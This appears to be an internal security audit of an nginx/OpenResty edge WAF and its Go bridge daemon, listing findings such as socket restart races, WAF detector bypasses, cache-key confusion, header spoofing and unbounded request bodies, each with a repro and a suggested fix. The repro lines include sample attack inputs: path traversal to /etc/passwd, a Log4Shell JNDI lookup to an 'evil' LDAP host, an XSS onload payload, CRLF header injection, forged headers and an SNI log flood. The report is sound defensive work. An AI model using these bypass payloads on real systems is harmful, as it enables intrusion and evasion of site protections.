**What & why.** ServeSock binds the unix socket; on ctx cancel a goroutine calls ln.Close(), which (UnlinkOnClose default true) unlinks the path by name. ApplyConfig restarts on any config-key change by cancelling the old ctx and immediately launching a new ServeSock that does os.Remove+net.Listen, creating a fresh inode. If the new Listen wins the race, the old Close() then unlinks the path pointing at the NEW socket, leaving the server listening on an fd with no filesystem entry; every worker dial gets ENOENT and falls back to snapshot/self-signed.

**Repro / cost.** Rotate the token or change SockPath/TTL/PEMMax while running: new os.Remove+Listen creates inode B; old goroutine's ln.Close() then unlink(path) removes B; socket unreachable by name.

**Suggested fix.** Bind new server to a temp path and rename into place, or SetUnlinkOnClose(false) and manage the file lifetime, or make ApplyConfig wait (done chan) for the old goroutine before relaunch.

**Fix landed:** `ServeSock` now calls `ln.(*net.UnixListener).SetUnlinkOnClose(false)` right after `net.Listen`, so `Close()` only drops the fd and never `unlink()`s the path by name — a lagging old-generation Close can no longer delete a restart's new inode, regardless of who wins the bind race (no serialization needed). The existing `os.Remove(SockPath)` before `net.Listen` still owns stale-file cleanup, and the lifecycle's disable/Stop paths now `os.Remove` the name explicitly (previously the unlink-on-close did it) so a disabled daemon doesn't leave a live-looking socket (ENOENT, not ECONNREFUSED). **Design chosen over the alternatives** (temp-path+rename; wait-on-done serialized restart) because it is a one-liner with no added blocking on the daemon tick, and the design workflow confirmed serialized-wait is insufficient alone (ServeSock returns when srv.Close unblocks Serve, *before* the cleanup goroutine's ln.Close runs). **Test** `TestServeSock_RestartDoesNotUnlinkNewSocket` (`lifecycle_socket_test.go`) reproduces the exact ordering via inode tracking (start B on the same path, wait for the name to resolve to B's new inode, THEN close A) and asserts the name still resolves to B — **verified to FAIL with `SetUnlinkOnClose(true)`** (non-vacuous). PR #TBD.

---

<a id="f28"></a>
### F28 — sslcollector socket server that exits on its own (Serve error) is never restarted

- **Status:** ☑ done — liveness-keyed no-change guard + generation-guarded goroutine respawn with bounded backoff, all mutex-guarded
- **Severity:** medium · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `internal/sslcollector/lifecycle.go:113`

**What & why.** When ServeSock's srv.Serve(ln) returns a non-nil error while ctx is NOT cancelled, the goroutine just logs and returns; l.cancel and l.cfgKey are left set. The next ApplyConfig tick hits the no-change guard `key==l.cfgKey && l.cancel!=nil` and returns early, so the server is never respawned. The socket stays down for the daemon's life (until a config change or full restart), degrading every edge worker to snapshot/self-signed. **The realistic trigger is broader than the finding states:** ServeSock returns the same way on a **transient bind failure at startup** (`net.Listen` failing on a stale socket / not-yet-ready parent dir / EADDRINUSE), so a one-off boot-time hiccup wedges the socket permanently — not only a rare post-startup Serve error.

**Repro / cost.** Serve returns an error post-startup with c.Err()==nil -> goroutine logs 'sock server stopped' and exits -> l.cancel non-nil, cfgKey unchanged -> every later ApplyConfig early-returns, no recovery.

**Suggested fix.** On unexpected goroutine return (ctx not cancelled) reset l.cancel=nil/l.cfgKey='' under a mutex so the next tick re-establishes the server, or supervise with bounded-backoff restart.

**Fix landed:** `SockLifecycle` now carries a `sync.Mutex` guarding all lifecycle state plus a `running` flag, a monotonic `gen`, and `failCount`/`nextAttempt` backoff bookkeeping. The spawned goroutine, on exit, clears `running` **only if its `gen` is still current** (`if l.gen == myGen`) — a generation guard so a superseded goroutine (from a config-change restart) can never clobber the new generation's liveness. The no-change guard is now `key == l.cfgKey && l.running` (liveness, not the stale `cancel` handle), so a dead server no longer early-returns forever; a same-config dead server is respawned, **rate-bounded by exponential backoff** (`sockBackoff`: 5s→5m, doubling; reset on a healthy tick; a genuine config change bypasses backoff). `Stop()` sets a `stopped` flag that makes ApplyConfig a no-op (no respawn after shutdown). All goroutine inputs are passed **by value** (removing a latent capture of the `cfg` pointer). **Design via a 3-way design workflow** (minimal-mutex / serialized-supervisor / atomic-liveness → synthesis); took the mutex over the synthesis's lock-free single-atomic so `-race` *verifies* the synchronization and the goroutine uses the real error value rather than a subtle "ServeSock returns nil only after cancel" state-inference — robustness over minimalism for a TLS-critical path. **Tests** (`lifecycle_socket_test.go`, run under `-race`, clean over `-count=20`): `RespawnsAfterTransientBindFailure` (bind under a missing parent dir → later tick respawns and binds — **verified to FAIL against a simulated old never-respawn wedge**), `NoRespawnAfterStop`, `BackoffGatesRespawn`, plus (folded in from review) `ConfigChangeRestartStaysDialable` (drives ApplyConfig twice with a rotated token → the real production restart path → asserts a fresh inode, live+dialable) and `DisableThenReEnable`. **Adversarially reviewed via a 3-lens review workflow** (concurrency/race → *ship*: generation guard proven correct because ApplyConfig holds `l.mu` across the whole respawn critical section, no deadlock/race, `-race -count=10` clean; correctness; test-adequacy). Two review should-fixes folded in: **(a)** the lifecycle tests were writing the LIVE `/var/lib/cfm/lua/cfm_token.lua` (hardcoded const) — a `go test` on a root host that also runs the daemon would overwrite the live socket-auth token, the very outage class this fix prevents; made the shared-Lua paths injectable (`luaTokenPath`/`luaConfigPath`, default to the consts) and redirected the tests to `t.TempDir()` (verified hermetic); **(b)** added the ApplyConfig-level restart + disable/re-enable coverage above. PR #TBD.

---

## Low

<a id="f30"></a>
### F30 — URI+args scan capped at 2048 bytes lets query-string padding push a payload past traversal/RCE/XSS/SQLi URI inspection

- **Status:** ☐ open
- **Severity:** low · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf.lua:617`

**What & why.** get_scan_ua()=normalize(cap(uri..'?'..args, max_scan_len)) with max_scan_len=2048 is the scan surface for detect_traversal(101), detect_rce(320), detect_xss(302) and the SQLi uri/args branch(301). nginx accepts URIs/query strings well past 2KB, so an attacker prepends ~2KB benign query bytes and places ../../, a jndi marker, or a UNION payload past offset 2048 where cap() truncates before any detector runs.

**Repro / cost.** GET /a?pad=<2048 bytes>&f=../../../../etc/passwd — traversal marker past byte 2048 is dropped by cap(), detect_traversal never sees ../.

**Suggested fix.** Raise max_scan_len to the realistic max URI length, or scan uri and args in separate windows.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f31"></a>
### F31 — should_push dedup key embeds the volatile score/tag suffix of the reason, defeating the (ip,reason) cooldown for scored/burst rules

- **Status:** ☐ open
- **Severity:** low · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf.lua:1621`

**What & why.** should_push keys the push-cooldown shdict on 'wafpush|'..reason..'|'..ip, but scored reasons carry a per-request suffix (e.g. WAF_BAD_UA:<tag>:score=N). A scanner hitting many URIs from one IP produces different scores/tags -> different keys -> shdict:add succeeds each time, escaping the 60s dedup. Each escape emits a full cfm.waf.log record AND an rpc_call('ip_push'), so the cooldown fails to bound RPC/log volume exactly under the scan-flood it targets.

**Repro / cost.** Empty-UA scanner GETs /.env, /wp-config.php, /backup/db.sql from one IP within 60s: scores 6,4,5 -> three distinct keys -> three pushes/RPCs instead of one.

**Suggested fix.** Key the cooldown on a stable family (reason:match('^([^:]+)') or rule_id) plus ip, not the full reason with score/tag suffix.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f32"></a>
### F32 — matches_rule recompiles the glob Lua pattern per request per glob entry (no precompile like Go)

- **Status:** ☐ open
- **Severity:** low · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_excl.lua:99`

**What & why.** For every glob exclude row, matches_rule calls glob_to_lua_pattern(rule) (two gsubs) then value:match(...) (compiles the pattern) on each invocation; it runs once per host row and once per path row on every WAF-eligible request. Go precompiles the regexp once at rebuild and reuses it. Cost is incurred only when glob excludes exist but each request rebuilds+recompiles rather than reusing a cached lookup.

**Repro / cost.** With a glob exclude present, N glob rows -> N pattern builds/compiles per request vs Go's zero.

**Suggested fix.** Cache the anchored pattern per rule string in a module-scope table (persists per worker via package.loaded).

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f33"></a>
### F33 — XSS event-handler checks require `=` immediately after the handler name, so whitespace (`onerror =`) evades onerror/onload/onmouseover/onfocus

- **Status:** ☐ open
- **Severity:** low · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:488`

**What & why.** detect_xss matches handlers with string.find(s,'%f[%w]onerror=',...) etc., requiring the name immediately followed by '='. HTML attribute parsers accept whitespace around '=', so 'onerror =' / 'onload\t=' are valid injections this misses; only four handlers are covered to begin with.

**Repro / cost.** Reflected <svg onload =alert(1)>: 'onload=' substring absent, %f[%w]onload= fails; browser still executes.

**Suggested fix.** Allow optional whitespace before '=' (%f[%w]onload%s*=) and cover more handlers.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f34"></a>
### F34 — CRLF raw-newline branch matches header names case-sensitively, missing canonically-capitalized injections (rule 605)

- **Status:** ☐ open
- **Severity:** low · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:1870`

**What & why.** The raw-CR/LF branch tests s:find('[\r\n]%W*set%-cookie%s*:') / location / content%-type / content%-length against a non-lowercased s. Response headers are conventionally capitalized (Set-Cookie:, Location:), so a body value injecting a raw newline + capitalized header name evades this branch. The URL-encoded branch does lowercase, so only raw-newline body-to-header reflection is missed.

**Repro / cost.** POST body value 'foo\r\nSet-Cookie: sid=evil': lowercase-only pattern fails on capitalized Set-Cookie; WAF_CRLF does not fire.

**Suggested fix.** Lowercase a copy of s for the raw-branch header-name matches, mirroring the encoded branch.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f35"></a>
### F35 — Log4Shell header precheck misses canonical uppercase %7B URL-encoding of ${

- **Status:** ☐ open
- **Severity:** low · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:3148`

**What & why.** The per-header gate is raw:find('${',1,true) or raw:find('%24%7b',1,true). The second needle is a case-sensitive match for lowercase-hex %24%7b, but standard URL-encoding emits uppercase %24%7B. A header carrying %24%7Bjndi:ldap://...%7D matches neither needle, the header is skipped, and the decode+lower branch never runs. Args/body path is unaffected (normalize double-decodes).

**Repro / cost.** User-Agent: %24%7Bjndi:ldap://evil/a%7D (uppercase hex, what curl produces): neither needle matches -> header skipped -> no JNDI:HDR tag.

**Suggested fix.** Case-fold the raw value before the precheck, or drop the encoded precheck and url_decode_once whenever a '%' is present.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f36"></a>
### F36 — C2 tunnel host list uses unbounded substring match; ix.io/ matches matrix.io/

- **Status:** ☐ open
- **Severity:** low · **Category:** fp (axis a) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:2688`

**What & why.** detect_c2_tunnel does has(s,p[1]) (plain substring) against normalized args+body for hosts like 'ix.io/'. With no left boundary, any longer hostname ending in the token matches (matrix.io/, phoenix.io/). A body referencing matrix.io is tagged C2_TUNNEL:IX_IO. Rule is logonly today (log noise/hit-rate skew), but the substring looseness becomes a real FP if promoted.

**Repro / cost.** Body containing https://matrix.io/_matrix/... -> has(s,'ix.io/') true -> IX_IO.

**Suggested fix.** Anchor host tokens at a boundary (require preceding scheme/'//'/non-host char) or drop short entries like 'ix.io/' before any promotion.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f37"></a>
### F37 — detect_smuggling_cl cannot see duplicate Content-Length/Transfer-Encoding headers (table collapsed by header_string)

- **Status:** ☐ open
- **Severity:** low · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:2790`

**What & why.** detect_smuggling_cl derives cl/te via header_string(), which for a duplicate header returns only the first array element, then the MULTI_CL/MULTI_TE branches rely on a comma inside that single value on the false assumption that nginx joins duplicates with ', '. But ngx.req.get_headers returns duplicate headers as a Lua table (detect_range_abuse in the same file relies on exactly that with a type()=='table' guard). So genuine duplicate CL/TE lines are collapsed to the first value and MULTI_CL/MULTI_TE never fire; there is no type-table guard here. nginx pre-rejecting duplicate CL blunts impact, but the two detectors are inconsistent and the comment is wrong.

**Repro / cost.** Two Transfer-Encoding lines reach Lua as a table; header_string returns the first ('chunked'); has(te_low,',') false; MULTI_TE cannot fire.

**Suggested fix.** Before header_string(), check type(headers[...])=='table' and return MULTI_CL/MULTI_TE directly (mirror detect_range_abuse); fix the comment.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f38"></a>
### F38 — Decision cache key truncates the URI to 64 bytes and omits the query string, so distinct URIs sharing a 64-char prefix share one cached verdict

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:924`

**What & why.** get_decision() builds the non-static cache key from uri:sub(1,64) (query excluded), while the bridge RPC is sent the full uri. Two paths sharing the first 64 bytes map to the same cfm_decisions entry, and only clean allows are cached, so an attacker warms the cache with a benign same-prefix request then reuses the 'allow' for a longer URI whose per-path bridge rule would otherwise challenge/block — the bridge is never consulted for the second URI.

**Repro / cost.** Request A GET /<64 filler bytes> -> clean allow cached; Request B GET /<same 64 bytes>/<per-path-ruled-suffix> -> cache hit, allow, bridge and per-URI rule skipped.

**Suggested fix.** Hash the full uri (ngx.md5) into the key and include an args hash if bridge verdicts can depend on args.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f39"></a>
### F39 — Decoded control characters in ngx.var.uri are written unescaped into error-log lines, enabling log forging

- **Status:** ☐ open
- **Severity:** low · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:1274`

**What & why.** Several log_route()/ngx.log() calls concatenate ngx.var.uri (percent-decoded, normalized) directly into the message. A path containing %0A/%0D decodes to a literal newline/CR inside uri, and ngx.log does not sanitize, so an unauthenticated client injects forged '[cfm] ...' lines into error.log. The well-known path logs at INFO on every /.well-known/ request pre-auth.

**Repro / cost.** GET /.well-known/x%0A2026/07/08%20fake%20[cfm]%20bypass=self_ip -> uri decodes to contain a newline -> two lines written, the second attacker-controlled.

**Suggested fix.** Sanitize control chars before logging user-controlled uri/values (or log the raw-encoded ngx.var.request_uri) at all call sites.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f40"></a>
### F40 — cfm_clearance normalize_host mangles IPv6-literal hosts, weakening clearance host-binding and diverging from the Go normalizer

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_clearance.lua:17`

**What & why.** The Lua host normalizer strips a trailing ':<digits>' as if always a port: h:gsub(':%d+$',''). For an IPv6-literal Host this deletes the final hextet and never unwraps brackets, so 2001:db8::1 and 2001:db8::2 both normalize to '2001:db8:'. The Go normalizeClearanceHost() handles brackets and net.SplitHostPort correctly. validate() re-runs the same broken normalizer over both sides so the common case fails closed (not a bypass), but it weakens host binding — a clearance minted for one IPv6 literal is accepted on any adjacent IPv6 host sharing all but the last hextet — and diverges Go vs Lua. Bounded because IPv6-literal Host headers are rare on shared hosting.

**Repro / cost.** Clearance solved for Host [2001:db8::1] is accepted on [2001:db8::2]; both normalize to '2001:db8:' so the obj.host==host scope check passes.

**Suggested fix.** Match Go semantics: unwrap [ ... ] for IPv6 literals and only strip a trailing port when the remainder is not an unbracketed IPv6 address.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f41"></a>
### F41 — Challenge scope (panel_scope) is derived from client-controlled X-CFM-Panel-Port/X-Forwarded-Port, defeating per-port clearance isolation

- **Status:** ☐ open
- **Severity:** low · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_panel.lua:851`

**What & why.** panel_scope = clearance_validator.panel_scope(http_x_cfm_panel_port, http_x_forwarded_port, origin, server_port). On the main access_by_lua request the first two args are attacker-suppliable (the listener only injects trusted X-CFM-Panel-Port on the /__cfm_* sub-locations), and the client header takes priority over the trusted $server_port. Since scope is a per-port label bound into the clearance HMAC, a user holding a valid clearance for panel:2083 can present it on the WHM 2087 listener with X-CFM-Panel-Port: 2083 and skip the 2087 challenge. Not privilege escalation (scope carries no auth dimension; user already holds a valid clearance) but voids the per-port isolation the scope exists for.

**Repro / cost.** Solve challenge on 2083 (cookie bound to panel:2083), then request the 2087 listener with header X-CFM-Panel-Port: 2083 -> scope panel:2083 -> existing cookie validates -> 2087 challenge bypassed.

**Suggested fix.** Derive scope from the trusted $server_port / config-set origin port only; ignore client X-CFM-Panel-Port/X-Forwarded-Port unless the connection is proven internal.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f43"></a>
### F43 — sslcollector emits an unbounded per-handshake WARN on every SNI cache-miss (attacker-driven log amplification)

- **Status:** ☐ open
- **Severity:** low · **Category:** dos (axis b/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/sslcollector.lua:739`

**What & why.** On the ssl_certificate_by_lua hot path, every unmatched SNI logs ngx.WARN 'cache miss sni=...' and every parse/set failure logs ngx.ERR, with no negative caching, rate limiting or aggregation — one synchronous error_log write per handshake. An attacker opens TLS connections with random SNI values (none in _store), forcing one WARN per connection and growing error_log unbounded (disk exhaustion) plus I/O contention on legitimate handshakes. Cert selection itself fails safe to the static default.

**Repro / cost.** Loop openssl s_client -servername rand-$RANDOM.example against the edge -> one WARN line per connection with no throttle.

**Suggested fix.** Rate-limit/aggregate miss and parse-fail logging (per-worker counter, one summary WARN per interval) or drop miss logging to debug; never log attacker SNI at WARN per handshake.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f44"></a>
### F44 — Client-controlled X-Forwarded-Proto forwarded verbatim to origin ($cf_xfp) in DNAT-direct mode

- **Status:** ☐ open
- **Severity:** low · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/openresty.conf:130`

**What & why.** map $http_x_forwarded_proto $cf_xfp passes the client-supplied header through unchanged (falling back to $scheme only when absent), then sends it to origin as X-Forwarded-Proto on the PHP/static/media/'/' locations. There is no trusted-proxy gate (unlike real_ip). In DNAT-direct deployments (no Cloudflare) an attacker hitting :9080 over plaintext sends X-Forwarded-Proto: https, making the backend believe the request is secure — bypassing app HTTP->HTTPS enforcement and enabling secure-cookie issuance over cleartext. Same in angie.

**Repro / cost.** curl -H 'X-Forwarded-Proto: https' http://edge:9080/ -> origin receives X-Forwarded-Proto: https on a plaintext request.

**Suggested fix.** Only honor inbound X-Forwarded-Proto when the peer is a trusted proxy; otherwise set $scheme.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f45"></a>
### F45 — Bridge token rotation opens a fail-open enforcement window of up to the 10s cache TTL

- **Status:** ☐ open
- **Severity:** low · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_bridge_cfg.lua:70`

**What & why.** token() serves the bridge auth token from cfm_filecache with ttl=10. Outbound consumers (cfm.lua) keep presenting the cached OLD token for up to 10s after the daemon rotates it. The Go bridge compares against the single current value and rejects a stale token 401/403; get_decision then routes through fail_decision which with default fail_open=1 returns allow. Net: during rotation, IP/vhost/rule blocks and challenges are bypassed for up to 10s. Rotation is documented as rare (weak-token replacement at startup), so the window is narrow.

**Repro / cost.** Daemon rotates token at startup -> edge holds OLD in cfm_filecache up to 10s -> every bridge decision 401/403 -> fail_decision allow -> a listed/blocked IP served for up to 10s.

**Suggested fix.** Have the daemon accept the previous token for a grace period spanning the edge TTL, or treat a bridge 401/403 as a distinct condition that force-refreshes token() once before falling to fail_open.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f46"></a>
### F46 — cfm_geo disables geo permanently per worker on a transient init/open failure, with no retry until proxy reload

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** PLAUSIBLE
- **Location:** `configs/lua/cfm_geo.lua:77`

**What & why.** On the first lookup an init/open failure sets _geo_api_mode='disabled' permanently for the worker's lifetime with no retry; country() returns '' for every later request until reload. A MaxMind DB update replaces the .mmdb via rename; a worker running its once-per-worker init during the swap window gets a transient open error and geo stays off indefinitely. '' is fail-open for country blocklists but fail-CLOSED for allowlists, so a worker silently stops enforcing an allowlist with no self-recovery.

**Repro / cost.** Worker's first geo request lands during a GeoLite2 atomic rename -> mmdb.init returns err -> _geo_api_mode disabled -> country() returns '' for all later requests; a subsequent good DB is never picked up without reload.

**Suggested fix.** Distinguish a transient open failure from an unsupported API: leave _geo_api_mode intact and clear only the init-done flag so a later request retries (bounded by a short cooldown).

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f47"></a>
### F47 — Missing bridge token 500s every request (fail-closed) while a present-but-unreachable daemon fails open — behavior flips on file presence, not reachability

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:129`

**What & why.** When cfm_bridge_cfg.token() returns nil (missing/unreadable token file), cfm.lua raises error() at module top level; because access_by_lua_file re-executes the chunk per request this yields HTTP 500 for every request. But when the token file EXISTS and the daemon is down, the bridge RPC fails and fail_decision returns allow under default fail_open=1. Identical 'cannot talk to daemon' conditions produce opposite outcomes based only on token-file presence. On a reboot where nginx starts before the daemon writes the token, the whole vhost returns 500 until the daemon starts.

**Repro / cost.** Boot: nginx up, daemon not started -> token file absent -> error() -> 500 for all requests; same daemon down with a leftover token file -> fail_open -> allowed.

**Suggested fix.** Apply one uniform 'daemon uncontactable' policy (gate the missing-token error behind fail_open, or enforce a startup readiness gate so nginx does not serve until the token exists).

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f48"></a>
### F48 — UA-emergency refresh reads the entire JSON file on the request path every 3s per worker (not mtime as the comment claims)

- **Status:** ☐ open
- **Severity:** low · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_ua_emergency.lua:133`

**What & why.** check() runs on every request and calls refresh_if_needed(), which every 3s per worker does a blocking io.open + f:read('*a') of the whole file plus a full string compare — a synchronous filesystem read in the access phase. The module header claims it stats mtime; the code does not. File is small so impact is minor, but it is blocking hot-path I/O (unlike cfm_h3 which uses an async timer) and the comment misdescribes behavior.

**Repro / cost.** Every 3s window the first request into each worker triggers a synchronous io.open+read of /var/lib/cfm/ua_emergency.json in access phase, regardless of change.

**Suggested fix.** stat mtime/size first and only read+decode on change, or move refresh to an ngx.timer like cfm_h3_config.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f49"></a>
### F49 — Five POST bridge handlers decode request bodies with no size limit (unbounded JSON read)

- **Status:** ☐ open
- **Severity:** low · **Category:** dos (axis b/c) · **Verify:** CONFIRMED
- **Location:** `internal/webdetector/nginx_bridge.go:1619`

**What & why.** handleIPPush(1619), handleIPClear(1678), handleVhostPush(1697), handleVhostClear(1729) and handleWAFStats(2091) call json.NewDecoder(r.Body).Decode directly with no http.MaxBytesReader, unlike handleUpload/handleOKTouch/handleObserve/handleEventsBatch which cap. handleWAFStats is worst: an arbitrarily large rows array is fully decoded then fans out one dispatchHook per row. The server sets only ReadHeaderTimeout (no ReadTimeout), so a slow/large body pins a goroutine. Token-gated (cfm-group), so robustness gap rather than remote DoS, but the WAF/stats path is attacker-influenced in size.

**Repro / cost.** A compromised/buggy edge worker POSTs /nginx/waf/stats with a hundreds-of-MB rows array; Go buffers and decodes it all, spiking RSS and enqueuing a hook per row.

**Suggested fix.** Wrap each body in http.MaxBytesReader with a sane cap and bound the number of rows in handleWAFStats.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f51"></a>
### F51 — Decision bridge server has no ReadTimeout/WriteTimeout/IdleTimeout and no goroutine cap on non-decision endpoints

- **Status:** ☐ open
- **Severity:** low · **Category:** dos (axis b/c) · **Verify:** CONFIRMED
- **Location:** `internal/webdetector/nginx_bridge.go:1388`

**What & why.** The http.Server is configured only with ReadHeaderTimeout: 2s. The decisionSem cap protects only handleDecision; all POST endpoints (ip/vhost push+clear, observe, waf/stats, upload, events/batch) are goroutine-per-connection with no upper bound. A caller presenting the token, sending headers, then stalling mid-body pins a goroutine indefinitely (compounded by the missing body caps). Token-gated so local/cfm-group robustness rather than remote DoS, but back-pressure is a stated design goal these endpoints are exempt from.

**Repro / cost.** Open N keep-alive connections with a valid token, send valid headers for POST /nginx/ip, then trickle the body 1 byte/sec; each pins a goroutine with no ReadTimeout and no semaphore.

**Suggested fix.** Set ReadTimeout/WriteTimeout/IdleTimeout and extend a concurrency cap or body-size limits to the POST handlers.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f52"></a>
### F52 — Ingest socket accept loop has no cap on concurrent connections/goroutines

- **Status:** ☐ open
- **Severity:** low · **Category:** dos (axis b/c) · **Verify:** CONFIRMED
- **Location:** `internal/webdetector/ingest_socket.go:145`

**What & why.** Serve's accept loop spawns one serveConn goroutine per connection with no concurrency limit, each holding a 256KB bufio.Reader. Normal use is one persistent connection per worker, but a cfm-group process can open many connections and pin memory/goroutines (compounded with the unbounded per-connection read). Same cfm-group trust boundary, so bounded, but no backpressure/max-connection guard.

**Repro / cost.** Open N connections from a cfm-group process and hold them idle within the 60s deadline; each consumes a goroutine + 256KB buffer with no ceiling.

**Suggested fix.** Add a bounded semaphore / max in-flight connection count, refusing beyond the cap.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f54"></a>
### F54 — Atomic Lua-token writer omits fsync before rename; a crash can expose an empty/truncated token to the edge

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `internal/sslcollector/token.go:245`

**What & why.** writeLuaFileAtomic writes tmp then os.Rename with no f.Sync() before the rename (the sibling snapshot writer DOES fsync, and this function's own doc-comment lists 'fsync before rename' as a fix that never landed). rename metadata can reach disk before the file data on power loss, leaving cfm_token.lua present but zero-length/partial after an unclean reboot; the edge loads a bad token at init_worker, so X-SSLCollector-Token mismatches and every /cert and /dumpall call 403s until the token is rewritten.

**Repro / cost.** WriteFile(tmp) buffered in page cache; Rename makes the name durable via journal while tmp data blocks are not yet flushed; power loss -> cfm_token.lua empty/partial -> socket auth fails.

**Suggested fix.** Open tmp, Write, f.Sync(), Close, then Rename (mirror writeSnapshotAtomic); optionally fsync the parent dir.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f55"></a>
### F55 — Operator-supplied token emitted into Lua via Go %q can produce invalid LuaJIT and break token loading

- **Status:** ☐ open
- **Severity:** low · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `internal/sslcollector/token.go:214`

**What & why.** ValidateOrGenerateToken returns an operator token unchanged whenever len>=32 and it is not a known placeholder, with no character-set restriction, then writes it as `return %q` (Go quoting). Go's %q escapes non-printable non-ASCII runes as \uXXXX / \UXXXXXXXX, which are NOT valid LuaJIT escapes (LuaJIT expects \u{...} or \ddd/\xHH). An operator pasting a 32+ char token containing e.g. a zero-width space gets a cfm_token.lua that fails to compile, taking edge<->collector auth down. Low confidence (requires a weird token).

**Repro / cost.** Set SSLCOLLECTOR_SOCK_TOKEN to a 32+ char string containing U+200B -> writeLuaToken emits `return "...​..."` without braces -> LuaJIT parse errors -> cfm_token.lua fails to load.

**Suggested fix.** Restrict accepted tokens to [A-Za-z0-9._-], or emit with a Lua-safe escaper / long-bracket literal instead of Go %q.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f56"></a>
### F56 — /__ssl_debug protected only by forgeable `allow 127.0.0.1`, unlike purge-ip's documented second loopback gate

- **Status:** ☐ open
- **Severity:** low · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/openresty.conf:623`

**What & why.** location = /__ssl_debug is gated solely by allow 127.0.0.1; deny all; which matches the real_ip-rewritten $remote_addr. The adjacent /cfm-admin/purge-ip block documents this coarse gate is forgeable behind Cloudflare/real_ip via CF-Connecting-IP and adds a second Lua check_loopback() on $realip_remote_addr; /__ssl_debug has no such second gate, so it is inconsistent with the project's loopback-trust model and can leak sslcache readiness/version meta to a spoofed-loopback request. Same in angie (608/1081).

**Repro / cost.** Where a trusted proxy relays the connection, a request with spoofed CF-Connecting-IP:127.0.0.1 gets $remote_addr rewritten to 127.0.0.1, passes allow 127.0.0.1, and reads sslcache meta from /__ssl_debug.

**Suggested fix.** Add the same check_loopback() on $realip_remote_addr used by purge-ip, or bind the endpoint to a value real_ip cannot rewrite.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f57"></a>
### F57 — purge_ip scans the entire cfm_decisions dict under lock (get_keys(0)) on a force-unblock

- **Status:** ☐ open
- **Severity:** low · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_purge.lua:128`

**What & why.** purge_ip calls sh:get_keys(0) (all keys) on the 64m cfm_decisions dict and holds the dict lock for the full scan, blocking all workers' access-phase lookups during a force-unblock. Gated to a rare loopback+token admin action so blast radius is limited, but a burst of force-unblocks each triggers a full lock-holding scan of a very large dict, causing request-latency spikes.

**Repro / cost.** On an edge with a large cfm_decisions keyspace, issue several force-unblocks in quick succession; each performs a full get_keys(0) scan under the dict lock.

**Suggested fix.** Cap/batch the scan or maintain a per-IP secondary index so a purge deletes a known key set instead of scanning all keys.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f58"></a>
### F58 — args-only normalize(cap(args)) recomputed by ~6 detectors per request instead of being memoized once

- **Status:** ☐ open
- **Severity:** low · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:1117`

**What & why.** The engine memoizes scan_str(uri,args) and normalize(args&body), but every detector needing args ALONE re-normalizes it: detect_cmd_param_key(1117), detect_cmd_payload(1157), detect_debug_toggles(1282), detect_php_serialize(1327), detect_bad_utf8 args branch(3292) and is_known_legit_xmlrpc(850) each call normalize(cap(args,max_scan_len)). All run on every request with non-empty args, so up to ~6 identical normalize+cap+lower passes (each a fresh lowered allocation + two url_decode gsubs when a '%' is present) over the same args string.

**Repro / cost.** A 300-byte query string with %xx escapes triggers ~6 independent normalize(cap(args)) calls, ~6x the necessary string work.

